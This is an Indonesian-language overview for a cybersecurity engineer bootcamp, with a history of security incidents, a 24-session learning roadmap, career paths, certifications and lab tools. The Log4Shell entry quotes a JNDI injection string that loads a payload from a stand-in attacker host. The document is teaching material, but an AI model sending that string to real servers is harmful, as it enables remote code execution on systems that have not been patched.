# 🗺️ ROADMAP LENGKAP: CYBERSECURITY ENGINEER

> *"The only truly secure system is one that is powered off, cast in a block of concrete, and sealed in a lead-lined room with armed guards."* — Gene Spafford

---

## 📜 SEJARAH CYBERSECURITY: Dari Awal Mula Hingga Era Modern

### Era Pra-Internet (1960an–1980an)

**1969 — ARPANET Lahir**
ARPANET (Advanced Research Projects Agency Network) adalah cikal bakal internet. Diciptakan oleh DARPA (Department of Defense AS). Pada masa ini, **keamanan bukan prioritas** — tujuannya murni riset dan komunikasi akademis. Tidak ada enkripsi, tidak ada autentikasi.

**1971 — Creeper: Virus Komputer Pertama**
Bob Thomas menciptakan **Creeper**, program yang bisa berpindah antar komputer di ARPANET dan menampilkan pesan: *"I'm the creeper, catch me if you can!"*. Ini bukan malware dalam arti jahat, tapi menjadi bukti konsep bahwa program bisa mereplikasi diri.

**Ray Tomlinson** kemudian membuat **Reaper**, program pertama yang dirancang untuk menghapus Creeper — ini bisa dianggap sebagai **antivirus pertama di dunia**.

**1978 — Spam Email Pertama**
Gary Thuerk mengirim email massal ke 393 pengguna ARPANET untuk mempromosikan komputer DEC. Ini menjadi cikal bakal spam.

**1983 — "WarGames" dan Kesadaran Publik**
Film WarGames menggambarkan seorang remaja yang hampir memicu Perang Dunia III dengan meretas komputer militer AS. Film ini:
- Meningkatkan kesadaran publik tentang keamanan komputer
- Mendorong pemerintah AS membuat **Computer Fraud and Abuse Act (1986)**
- Menjadi inspirasi generasi pertama hacker

**1986 — Computer Fraud and Abuse Act (CFAA)**
Undang-undang pertama di AS yang mengkriminalisasi akses komputer tanpa izin. Masih berlaku hingga sekarang (dengan amandemen).

**1988 — Morris Worm: Insiden Keamanan Internet Pertama**
Robert Tappan Morris, mahasiswa Cornell, membuat worm yang menyebar melalui internet dan menginfeksi ~6.000 komputer (sekitar 10% dari seluruh internet saat itu). Dampaknya:
- Kerugian estimasi $100.000–$10.000.000
- Morris menjadi orang pertama yang dihukum di bawah CFAA
- Mendorong pembentukan **CERT/CC (Computer Emergency Response Team)** di Carnegie Mellon

### Era Internet Awal (1990an)

**1990 — Operasi Sundevil**
FBI dan Secret Service AS melakukan razia besar-besaran terhadap komunitas hacker, menyita 42 komputer dan 23.000 floppy disk. Ini menandai era di mana pemerintah mulai serius menangani cybercrime.

**1993 — DEF CON Pertama**
Jeff Moss (Dark Tangent) menyelenggarakan konferensi hacker pertama di Las Vegas. DEF CON hingga kini menjadi konferensi keamanan terbesar di dunia.

**1994 — Netscape & SSL**
Netscape memperkenalkan **SSL (Secure Sockets Layer)**, protokol enkripsi pertama untuk mengamankan komunikasi web. Ini menjadi fondasi e-commerce dan banking online.

**1995 — Kevin Mitnick Ditangkap**
Kevin Mitnick, hacker paling dicari FBI, akhirnya ditangkap setelah bertahun-tahun meretas sistem perusahaan besar. Kisahnya mempopulerkan istilah **social engineering** — teknik manipulasi manusia, bukan teknis.

**1998 — Google Lahir & Era Information Gathering**
Google menjadi tools gathering information terkuat. Kemudian muncul istilah **Google Dorking** — menggunakan operator pencarian untuk menemukan informasi sensitif yang terekspos.

**1999 — Melissa Virus**
Virus yang menyebar melalui email Microsoft Outlook, menginfeksi ratusan ribu komputer dalam hitungan jam. Ini menunjukkan betapa berbahayanya **email-based attacks**.

### Era Modern (2000an–Sekarang)

**2000 — ILOVEYOU Worm**
Worm dari Filipina yang menyebar via email dengan subject "I LOVE YOU". Menginfeksi ~45 juta komputer dan menyebabkan kerugian $10 miliar. Pelakunya tidak dihukum karena Filipina belum punya undang-undang cybercrime.

**2003 — SQL Slammer & Blaster**
- **SQL Slammer**: Menginfeksi 75.000 server dalam 10 menit, memperlambat internet global
- **Blaster Worm**: Menyerang Windows XP/2000, menampilkan pesan: *"billy gates why do you make this possible?"*

**2007 — Serangan Siber ke Estonia**
Rusia (diduga) melancarkan serangan DDoS masif ke Estonia, melumpuhkan bank, media, dan pemerintahan. Ini menjadi **serangan siber negara (nation-state) pertama yang terdokumentasi** dan mengubah paradigma perang modern.

**2010 — Stuxnet: Senjata Siber Pertama**
Malware yang diciptakan (diduga) oleh AS dan Israel untuk menyabotase program nuklir Iran. Stuxnet menyerang sistem SCADA/PLC Siemens yang mengontrol sentrifugal uranium. Ini menandai era **cyber warfare** — perang yang dilakukan melalui kode.

**2013 — Edward Snowden & NSA Leaks**
Snowden membocorkan dokumen rahasia NSA yang mengungkap program pengawasan massal (PRISM). Dampaknya:
- Meningkatkan kesadaran global tentang privasi
- Mendorong adopsi enkripsi end-to-end
- Perusahaan tech mulai memperkuat keamanan

**2014 — Heartbleed (CVE-2014-0160)**
Bug di OpenSSL yang memungkinkan siapa pun membaca memori server. Sekitar 17% server web yang menggunakan TLS terpengaruh. Menunjukkan bahwa **satu bug di library kritis bisa mengancam seluruh internet**.

**2017 — WannaCry & NotPetya**
- **WannaCry**: Ransomware yang menyerang 200.000+ komputer di 150 negara, termasuk rumah sakit NHS Inggris. Menggunakan exploit **EternalBlue** yang dicuri dari NSA.
- **NotPetya**: Awalnya terlihat seperti ransomware, tapi sebenarnya adalah **wiper malware** yang bertujuan destruktif. Menyebabkan kerugian $10+ miliar.

**2020 — SolarWinds Supply Chain Attack**
Hacker (diduga Rusia/SVR) menyusup ke sistem build SolarWinds dan menyisipkan backdoor di update software Orion. Dampak:
- 18.000 organisasi terinfeksi, termasuk Pentagon, Treasury, dan Fortune 500
- Menunjukkan ancaman **supply chain attack**
- Mengubah cara industri memandang keamanan software supply chain

**2021 — Log4Shell (CVE-2021-44228)**
Kerentanan di library Apache Log4j yang memungkinkan **Remote Code Execution (RCE)** melalui string sederhana. Disebut sebagai salah satu kerentanan terburuk sepanjang sejarah karena:
- Log4j digunakan oleh jutaan aplikasi Java
- Eksploitasi trivial: cukup kirim string `${jndi:ldap://attacker.com/payload}`
- Masih ditemukan di banyak sistem hingga hari ini

**2023–2025 — Era AI-Driven Threats**
- AI digunakan untuk membuat phishing yang lebih meyakinkan
- Deepfake untuk social engineering
- AI-powered malware yang bisa berevolusi
- Tapi juga: AI untuk deteksi ancaman, automated response, dan threat hunting

---

## 🧭 ROADMAP BELAJAR: Urutan yang Benar

```
╔══════════════════════════════════════════════════════════════╗
║                    CYBERSECURITY ROADMAP                      ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  LEVEL 0: MINDSET & PRASYARAT                               ║
║  ├── Cara berpikir seperti hacker & defender                ║
║  ├── Bahasa Inggris teknis (wajib!)                         ║
║  └── Dasar komputer & logika                                ║
║                                                              ║
║  LEVEL 1: FONDASI (Phase 1 — P1–P6)                        ║
║  ├── P1: Pengenalan Cybersecurity & Threat Landscape        ║
║  ├── P2: Jaringan Komputer untuk Security                   ║
║  ├── P3: Linux Fundamentals & Sysadmin                      ║
║  ├── P4: Linux Networking & Security Hardening              ║
║  ├── P5: Kriptografi: Konsep & Implementasi                 ║
║  └── P6: PKI, TLS/SSL & Certificate Management             ║
║                                                              ║
║  LEVEL 2: OFFENSIVE SECURITY (Phase 2 — P7–P12)            ║
║  ├── P7:  Reconnaissance & OSINT                            ║
║  ├── P8:  Network Scanning & Enumeration                    ║
║  ├── P9:  Exploitation & Metasploit                         ║
║  ├── P10: Web Hacking — OWASP Top 10 (Bag. 1)              ║
║  ├── P11: Web Hacking — OWASP Top 10 (Bag. 2)              ║
║  └── P12: Privilege Escalation & Post-Exploitation          ║
║                                                              ║
║  LEVEL 3: DEFENSIVE SECURITY (Phase 3 — P13–P17)           ║
║  ├── P13: SOC & SIEM                                        ║
║  ├── P14: Log Analysis & Threat Detection                   ║
║  ├── P15: Incident Response & Digital Forensics             ║
║  ├── P16: Network Defense & IDS/IPS                         ║
║  └── P17: Endpoint Security & EDR                           ║
║                                                              ║
║  LEVEL 4: ADVANCED & SPECIALIZED (Phase 4 — P18–P23)       ║
║  ├── P18: Cloud Security                                     ║
║  ├── P19: DevSecOps & Secure SDLC                           ║
║  ├── P20: API Security & Modern AppSec                      ║
║  ├── P21: Vulnerability Management & Pentest Report         ║
║  ├── P22: Governance, Risk & Compliance (GRC)               ║
║  └── P23: Career Development & Sertifikasi                  ║
║                                                              ║
║  LEVEL 5: FINAL PROJECT (Phase 5 — P24)                     ║
║  └── P24: Red Team vs Blue Team Simulation                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

### Mengapa Urutannya Seperti Ini?

1. **Fondasi dulu, baru serang** — Kamu tidak bisa meretas apa yang kamu tidak pahami. Memahami jaringan, Linux, dan kriptografi adalah *prerequisite* mutlak.

2. **Offense informs defense** — Setelah tahu cara menyerang, kamu jadi tahu cara bertahan. Ini prinsip fundamental: *"To beat a hacker, think like a hacker."*

3. **Defense membutuhkan konteks** — SOC, SIEM, forensics hanya masuk akal jika kamu sudah mengerti serangan apa yang sedang dideteksi.

4. **Advanced topics butuh semua fondasi** — Cloud security, DevSecOps, GRC membutuhkan pemahaman menyeluruh dari semua level sebelumnya.

---

## 🎯 JALUR KARIR CYBERSECURITY

```
                        ┌──────────────────┐
                        │   ENTRY LEVEL    │
                        │  SOC Analyst L1  │
                        │  IT Security     │
                        │  Junior Pentester│
                        └────────┬─────────┘
                                 │
                    ┌────────────┼────────────┐
                    ▼            ▼            ▼
            ┌──────────┐ ┌──────────┐ ┌──────────┐
            │ OFFENSIVE│ │ DEFENSIVE│ │   GRC    │
            │──────────│ │──────────│ │──────────│
            │Pentester │ │SOC L2/L3 │ │Risk Mgr  │
            │Red Team  │ │Blue Team │ │Compliance│
            │Bug Hunter│ │Threat    │ │Auditor   │
            │AppSec Eng│ │Hunter    │ │CISO      │
            │Exploit   │ │DFIR      │ │Privacy   │
            │Developer │ │Malware   │ │Officer   │
            │          │ │Analyst   │ │          │
            └──────────┘ └──────────┘ └──────────┘
                    │            │            │
                    └────────────┼────────────┘
                                 ▼
                        ┌──────────────────┐
                        │  SENIOR / LEAD   │
                        │  Security Arch.  │
                        │  Principal Eng.  │
                        │  CISO            │
                        └──────────────────┘
```

### Roadmap Sertifikasi (Urutan Rekomendasi)

| Urutan | Sertifikasi | Fokus | Biaya (Perkiraan) |
|--------|-------------|-------|-------------------|
| 1 | **eJPT** (INE) | Entry-level pentesting | ~$249 |
| 2 | **CompTIA Security+** | Fondasi keamanan | ~$392 |
| 3 | **CEH** (EC-Council) | Ethical hacking | ~$1,199 |
| 4 | **OSCP** (OffSec) | Advanced pentesting | ~$1,499 |
| 5 | **CISSP** (ISC²) | Management/GRC | ~$749 |
| Opsional | **AWS Security Specialty** | Cloud security | ~$300 |

---

## 🛠️ TOOLS & ENVIRONMENT

### Software yang Dibutuhkan

| Fase | Tools |
|------|-------|
| P1–P6 | Kali Linux (VM), Ubuntu 22.04, Windows 10 VM, OpenSSL, Python, Wireshark |
| P7–P12 | Metasploit, Burp Suite, Nmap, SQLmap, Maltego, Shodan, msfvenom, DVWA, Metasploitable2 |
| P13–P17 | ELK Stack, Wazuh, Suricata, Volatility 3, Autopsy, REMnux VM, OpenVPN |
| P18–P21 | Docker, LocalStack, Minikube, SonarQube, OWASP ZAP, crAPI, GVM/OpenVAS |
| P22–P23 | Google Docs, LinkedIn, GitHub, Medium |

### Spesifikasi Minimum Komputer

| Komponen | Minimum | Rekomendasi |
|----------|---------|-------------|
| RAM | 16 GB | 32 GB |
| Storage | SSD 256 GB | SSD 512 GB |
| CPU | 4 core, i5 Gen 8+ / Ryzen 5 3000+ | 8 core, i7 Gen 10+ / Ryzen 7 5000+ |
| VM Software | VirtualBox 7.x (gratis) | VMware Workstation Player 17 |

---

## 📖 CARA MENGGUNAKAN MATERI INI

Setiap file materi mengikuti struktur:

1. **Konsep & Teori** — Penjelasan mendalam dengan analogi
2. **Mengapa Ini Penting** — Konteks dunia nyata
3. **Detail Teknis** — Langkah-langkah dan command
4. **Studi Kasus** — Insiden nyata yang relevan  
5. **Hands-On Lab** — Praktik yang bisa dilakukan
6. **Checklist Pemahaman** — Untuk self-assessment

> ⚠️ **PENTING**: Cybersecurity adalah bidang yang SANGAT hands-on. Membaca saja TIDAK CUKUP. 
> Setiap materi harus dipraktikkan di lab environment (VM).

---

*Materi ini disusun berdasarkan silabus "Cybersecurity Engineer Bootcamp — 24 Pertemuan" dengan penambahan konteks historis, pendalaman konsep, dan perspektif industri dari pengalaman profesional.*

*Lanjut ke: [Phase 1 — Fondasi Cybersecurity](../Phase1-Fondasi/)*
